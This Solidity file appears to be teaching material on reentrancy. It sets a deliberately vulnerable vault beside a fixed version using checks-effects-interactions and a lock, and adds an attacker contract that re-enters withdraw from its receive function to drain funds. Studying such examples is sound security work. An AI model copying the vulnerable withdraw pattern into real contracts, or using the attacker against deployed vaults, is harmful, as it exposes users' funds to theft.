// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // vulnerable: interaction before effect
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        balances[msg.sender] = 0;
    }
}

contract SafeVault {
    mapping(address => uint256) public balances;
    bool private locked;

    modifier nonReentrant() {
        require(!locked, "reentrant");
        locked = true;
        _;
        locked = false;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // checks-effects-interactions
        balances[msg.sender] = 0;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
    }
}

interface IVaultLike {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVaultLike public target;
    uint256 public maxSteps;
    uint256 public steps;

    constructor(address target_) {
        target = IVaultLike(target_);
    }

    function attack(uint256 maxSteps_) external payable {
        maxSteps = maxSteps_;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (steps < maxSteps) {
            steps++;
            target.withdraw();
        }
    }
}
